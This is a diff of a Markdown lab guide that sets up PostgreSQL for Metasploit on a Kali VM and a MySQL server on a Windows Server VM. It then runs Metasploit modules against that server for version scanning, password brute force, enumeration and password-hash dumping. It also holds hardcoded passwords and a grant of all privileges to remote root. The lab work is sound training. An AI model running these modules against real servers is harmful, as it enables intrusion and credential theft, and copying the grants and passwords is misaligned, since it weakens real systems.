@@ -1,5 +1,7 @@
 # Section 1: 
 
+## In Kali VM: 
+
 - Start PostgreSQL:
   ```bash
   sudo /etc/init.d/postgresql start
@@ -75,127 +77,149 @@
         ```bash
         db_connect –y /usr/share/metasploit-framework/config/database.yml
         ```
-      - Resolve PostgreSQL configuration issues if encountered:
-
-bash
-Copy code
-sudo nano /etc/postgresql/14/main/postgresql.conf
-# Uncomment and adjust lines like:
-# listen_addresses = 'localhost'
-log_timezone = 'UTC'
-TimeZone = 'UTC'
-
-sudo nano /etc/postgresql/14/main/pg_hba.conf
-# Ensure lines like:
-# local all postgres peer
-# local all all peer
-# host all all 127.0.0.1/32 md5
-Restart PostgreSQL:
-
-bash
-Copy code
-sudo systemctl restart postgresql
-Update Metasploit database configuration:
-
-bash
-Copy code
-sudo nano /usr/share/metasploit-framework/config/database.yml
-Example configuration:
-
-yaml
-Copy code
-development:
-  adapter: postgresql
-  database: msf6
-  username: msf6
-  password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
-  host: localhost
-  port: 5432
-  pool: 5
-  timeout: 5
-production:
-  adapter: postgresql
-  database: msf6
-  username: msf6
-  password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
-  host: localhost
-  port: 5432
-  pool: 5
-  timeout: 5
-Create PostgreSQL database and user for Metasploit:
-
-bash
-Copy code
-sudo su - postgres
-psql -p 5433
-CREATE DATABASE msf6;
-CREATE USER msf6 WITH PASSWORD 'RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=';
-GRANT ALL PRIVILEGES ON DATABASE msf6 TO msf6;
-Restart PostgreSQL and Metasploit:
-
-bash
-Copy code
-sudo systemctl restart postgresql
-sudo systemctl restart metasploit
-Reconnect to Metasploit console and continue:
-
-bash
-Copy code
-msfconsole
-db_connect –y /usr/share/metasploit-framework/config/database.yml
+      - If you encounter this error in PostgreSQL configuration:
+        ![Local Example](./images/local-example.png)
+         - Do the following :
+           ```bash
+           sudo nano /etc/postgresql/14/main/postgresql.conf
+           ```
+            - Uncomment this line :
+               ```bash
+              # listen_addresses = 'localhost'
+               ```
+            - Adjust those lines to look like this :
+              ```bash
+              log_timezone = 'UTC'
+              TimeZone = 'UTC'
+              ```
+            - Also go to this file
+              ```bash
+              sudo nano /etc/postgresql/14/main/pg_hba.conf
+              ```
+           - Ensure these lines exist:
+             ```bash
+             local   all     postgres       peer
+             
+             local   all     all            peer
+             host    all     all            127.0.0.1/32 md5
+             ```
+           - Restart PostgreSQL:
+             ```bash
+             sudo systemctl restart postgresql
+             ```
+           - if there are any other errors try :
+             ```bash
+             sudo tail -n 50 /var/log/postgresql/postgresql-14-main.log
+             ```
+      - Update Metasploit database configuration:
+        ```bash
+        sudo nano /usr/share/metasploit-framework/config/database.yml
+        ```
+        - Example my configuration:
+        <pre>
+        development:
+          adapter: postgresql
+          database: msf6
+          username: msf6
+          password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
+          host: localhost
+          port: 5432
+          pool: 5
+          timeout: 5
+        production:
+          adapter: postgresql
+          database: msf6
+          username: msf6
+          password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
+          host: localhost
+          port: 5432
+          pool: 5
+          timeout: 5
+         </pre>
+         
+      - Create PostgreSQL database and user for Metasploit:
+        ```bash
+        sudo su - postgres
+        psql -p 5433
+        CREATE DATABASE msf6;
+        CREATE USER msf6 WITH PASSWORD 'RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=';
+        GRANT ALL PRIVILEGES ON DATABASE msf6 TO msf6;
+        ```
+     - Restart PostgreSQL and Metasploit:
+       ```bash
+       sudo systemctl restart postgresql
+       sudo systemctl restart metasploit
+     - Reconnect to Metasploit console and continue:
+       ```bash
+       msfconsole
+       db_connect –y /usr/share/metasploit-framework/config/database.yml
+       ```
+       
+## In Windows Server VM (MySQL Server)
+     
 Example commands inside Metasploit console:
 
-bash
-Copy code
-use auxiliary/scanner/mysql/mysql_version
-Lab 4: SQL Injection on Windows Server
-Install MySQL server on Windows Server.
+- Install MySQL server on Windows Server
+- Open terminal and connect to MySQL:
+  ```bash
+  mysql -u root -p
+  ```
+- Set up MySQL users and permissions: (192.168.43.93 : is the ip @ of my kali VM , and 'mounaMYSQL19' is my SQL server password)
+  ```bash
+  CREATE USER 'root'@'192.168.43.93' IDENTIFIED BY 'mounaMYSQL19';  
+  GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.43.93';
+  FLUSH PRIVILEGES;
 
-Open terminal and connect to MySQL:
-
-bash
-Copy code
-mysql -u root -p
-Set up MySQL users and permissions:
-
-sql
-Copy code
-CREATE USER 'msf6'@'192.168.43.93' IDENTIFIED BY 'mounaMYSQL19';
-GRANT ALL PRIVILEGES ON *.* TO 'msf6'@'192.168.43.93';
-CREATE USER 'root'@'192.168.43.93' IDENTIFIED BY 'mounaMYSQL19';
-GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.43.93';
-FLUSH PRIVILEGES;
-Back to Kali, execute Metasploit commands:
-
-bash
-Copy code
-msf6 auxiliary(scanner/mysql/mysql_version)
-set RHOSTS 192.168.43.189
-run
-
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS 192.168.43.189
-set USERNAME root
-set PASS_FILE /mouna19/passwords.txt
-run
-Additional Metasploit MySQL enumeration:
-
-bash
-Copy code
-use auxiliary/admin/mysql/mysql_enum
-set RHOSTS 192.168.43.189
-set USERNAME root
-set PASSWORD mounaMYSQL19
-run
-
-use auxiliary/scanner/mysql/mysql_hashdump
-set RHOSTS 192.168.43.189
-set USERNAME root
-set PASSWORD mounaMYSQL19
-run
-Open another terminal window in Kali for MySQL console access:
-
-bash
-Copy code
-mysql -u root -p -h 192.168.43.189
-Enter the password (e.g., mounamySQL19) to access MySQL console.
+## In Kali VM
+  
+- inside msf console, execute Metasploit commands: ( 192.168.43.189 is the ip @ of my MYSQL server VM)
+- 1- 
+  ```bash
+  use auxiliary/scanner/mysql/mysql_version
+  ```
+- inside this console do :
+  ```bash
+  set RHOSTS 192.168.43.189
+  run
+  ```
+  ![Local Example](./images/local-example.png)
+- 2-
+  ```bash
+  use auxiliary/scanner/mysql/mysql_login
+- inside this console do :
+  ```bash
+  set RHOSTS 192.168.43.189
+  set USERNAME root
+  set PASS_FILE /mouna19/passwords.txt
+  run
+  ```
+  ![Local Example](./images/local-example.png)
+- 3-
+  ```bash
+  use auxiliary/admin/mysql/mysql_enum
+  ```
+- inside this console do :
+  ```bash
+  set RHOSTS 192.168.43.189
+  set USERNAME root
+  set PASSWORD mounaMYSQL19
+  run
+  ```
+  ![Local Example](./images/local-example.png)
+- 4-
+  ```bash
+  use auxiliary/scanner/mysql/mysql_hashdump
+  ```
+- inside this console do :
+  ```bash
+  set RHOSTS 192.168.43.189
+  set USERNAME root
+  set PASSWORD mounaMYSQL19
+  run
+  ```
+  ![Local Example](./images/local-example.png)
+- Open another terminal window in Kali for MySQL console access:
+  ```bash
+  mysql -u root -p -h 192.168.43.189
+- Enter the password (e.g., mounamySQL19) to access MySQL console.
+  ![Local Example](./images/local-example.png)
